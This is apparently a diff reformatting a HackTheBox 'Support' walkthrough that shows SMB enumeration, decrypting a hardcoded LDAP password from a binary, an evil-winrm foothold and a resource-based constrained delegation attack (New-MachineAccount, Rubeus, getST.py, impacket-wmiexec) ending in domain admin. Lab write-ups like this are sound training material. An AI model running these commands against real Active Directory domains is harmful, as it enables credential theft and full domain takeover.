@@ -1,19 +1,6 @@
----
-title: "HackTheBox Support Walkthrough"
-date: "2022-09-29"
-categories: 
-  - "htb-walkthroughs"
-tags: 
-  - "dig"
-  - "dnspy"
-  - "evil-winrm"
-  - "impacket"
-  - "rubeus"
-  - "rustscan"
-  - "smbclient"
-  - "windows"
-coverImage: "Support.png"
----
+# HackTheBox Support Walkthrough
+
+![](images/Support.png)
 
 As always, we start off with a rustscan.
 
@@ -103,33 +90,33 @@ We gain new information. Support.htb seems to be the DC domain name. Lets confir
 
 dig @10.10.11.174 +short support.htb 
 
-[![](images/image.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image.png)
+![](images/image.png)
 
 Now we can enumerate SMB to see if there is anything interesting.
 
 smbclient -N -L \\\\10.10.11.174
 
-[![](images/image-1.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-1.png)
+![](images/image-1.png)
 
 smbclient -N \\\\\\\\10.10.11.174\\\\support-tools
 
 Support-tools may be hiding relevant files.
 
-[![](images/image-2.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-2.png)
+![](images/image-2.png)
 
 Let's download all files to our local machine.
 
-[![](images/image-3-1024x222.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-3.png)
+![](images/image-3-1024x222.png)
 
 Unzip UserInfo.exe.zip and try to run the file. I used win64 but could not get the program to stop crashing. I gave up and moved to a windows machine.
 
-[![](images/image-4.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-4.png)
+![](images/image-4.png)
 
 The program seems to be searching LDAP users, let's check if the .exe file has any connection credentials hardcoded. Download dnSpy [https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)
 
 Upon inspecting the file. It wasn't hard to find the encrypted password.
 
-[![](images/image-5-1024x576.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-5.png)
+![](images/image-5-1024x576.png)
 
 getPassword() method is decrypting the password. All we have to do is run the code in our chosen programming language with slight variations. I chose to use C#.
 
@@ -145,9 +132,9 @@ for (int i = 0; i < array.Length; i++)
 }
 Console.WriteLine(Encoding.Default.GetString(array2));
 
-[![](images/image-6-915x1024.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-6.png)
+![](images/image-6-915x1024.png)
 
-[![](images/image-7-1024x544.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-7.png)
+![](images/image-7-1024x544.png)
 
 The encrypted password is now decrypted!
 
@@ -157,11 +144,11 @@ ldapsearch -x -H ldap://10.10.11.174 -D 'SUPPORT\\ldap' -w 'nvEfEK16^1aM4$e7AclU
 
 Browsing through ldap.txt. The account support has a string following 'info:' that looks a lot like a password.
 
-[![](images/image-8.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-8.png)
+![](images/image-8.png)
 
 We'll try connecting using evil-winrm.
 
-[![](images/image-9-1024x178.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-9.png)
+![](images/image-9-1024x178.png)
 
 And we've got our foothold on the machine!
 
@@ -182,7 +169,7 @@ We're able to add up to 10 computers to the domain. Let's try adding a new objec
 New-MachineAccount -MachineAccount MYACC -Password $(ConvertTo-SecureString 'password123' -AsPlainText -Force) -Verbose
 Get-DomainComputer myacc -Properties objectsid
 
-[![](images/image-10-1024x170.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-10.png)
+![](images/image-10-1024x170.png)
 
 The code below was borrowed from a friend. It's used to create a new security descriptor.
 
@@ -196,7 +183,7 @@ Now we need to upload Rubeus.exe into evil-winrm.
 upload /root/Rubeus.exe
 ./Rubeus.exe hash /password:password123 /user:MYACC$ /domain:support.htb
 
-[![](images/image-11.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-11.png)
+![](images/image-11.png)
 
 Save the aes256 hash because we'll use it later to generate a Kerberos ticket.
 
@@ -204,13 +191,13 @@ back on the kali machine. We will use the aes key to impersonate admin.
 
 getST.py support.htb/MYACC -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey C832FA9E499757C08A5AC999526613B97D6D5C6B0ABA5158512977266B817F72
 
-[![](images/image-12-1024x144.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-12.png)
+![](images/image-12-1024x144.png)
 
 export KRB5CCNAME=administrator.ccache
 impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
 
-[![](images/image-14.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-14.png)
+![](images/image-14.png)
 
 And we're admin!
 
-[![](images/image-13.png)](http://localhost/wordpress/wp-content/uploads/2022/09/image-13.png)
+![](images/image-13.png)
